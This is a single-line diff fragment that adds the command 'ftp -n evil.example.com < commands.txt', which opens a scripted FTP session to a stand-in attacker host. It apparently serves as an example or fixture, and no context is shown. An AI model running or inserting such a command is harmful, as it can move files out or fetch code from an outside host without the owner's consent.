@@ -1,0 +1,1 @@
+ftp -n evil.example.com < commands.txt
